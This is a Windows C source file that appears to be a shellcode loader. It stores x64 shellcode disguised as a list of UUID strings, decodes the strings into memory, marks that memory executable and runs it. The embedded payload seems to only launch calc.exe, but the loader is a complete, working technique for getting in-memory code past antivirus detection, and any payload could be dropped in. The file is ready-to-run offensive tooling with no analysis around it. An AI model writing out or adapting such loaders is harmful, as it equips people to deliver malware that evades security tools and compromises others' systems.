#include <Windows.h>
#include <stdio.h>

PCSTR uuid_payload[] = {
	"E48348FC-E8F0-00C0-0000-415141505251",
	"D2314856-4865-528B-6048-8B5218488B52",
	"728B4820-4850-B70F-4A4A-4D31C94831C0",
	"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
	"48514152-528B-8B20-423C-4801D08B8088",
	"48000000-C085-6774-4801-D0508B481844",
	"4920408B-D001-56E3-48FF-C9418B348848",
	"314DD601-48C9-C031-AC41-C1C90D4101C1",
	"F175E038-034C-244C-0845-39D175D85844",
	"4924408B-D001-4166-8B0C-48448B401C49",
	"8B41D001-8804-0148-D041-5841585E595A",
	"59415841-5A41-8348-EC20-4152FFE05841",
	"8B485A59-E912-FF57-FFFF-5D48BA010000",
	"00000000-4800-8D8D-0101-000041BA318B",
	"D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
	"C48348D5-3C28-7C06-0A80-FBE07505BB47",
	"6A6F7213-5900-8941-DAFF-D563616C632E",
	"00657865-0000-0000-0000-000000000000",
};

#define NUM_UUIDS sizeof(uuid_payload) / sizeof(PCSTR)
#define PAYLOAD_LEN NUM_UUIDS * sizeof(UUID)

typedef VOID PAYLOAD(VOID);

INT main(VOID) {
	PBYTE payload_buff;
	DWORD old_protection;
	UUID* uuid_data;

	payload_buff = VirtualAlloc(
		NULL,
		PAYLOAD_LEN,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	for (DWORD i = 0; i < NUM_UUIDS; i++) {
		uuid_data = (UUID*)(payload_buff + i * sizeof(UUID));

		sscanf_s(uuid_payload[i],
			"%08X-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX",
			&uuid_data->Data1,
			&uuid_data->Data2,
			&uuid_data->Data3,
			&uuid_data->Data4[0],
			&uuid_data->Data4[1],
			&uuid_data->Data4[2],
			&uuid_data->Data4[3],
			&uuid_data->Data4[4],
			&uuid_data->Data4[5],
			&uuid_data->Data4[6],
			&uuid_data->Data4[7]
		);
	}

	if ( ! VirtualProtect(payload_buff, PAYLOAD_LEN, PAGE_EXECUTE_READ, &old_protection) ) {
		puts("VirtualProtect failed");
		return 1;
	}

	PAYLOAD* fn_payload = (PAYLOAD*)payload_buff;

	fn_payload();

	return 0;
}
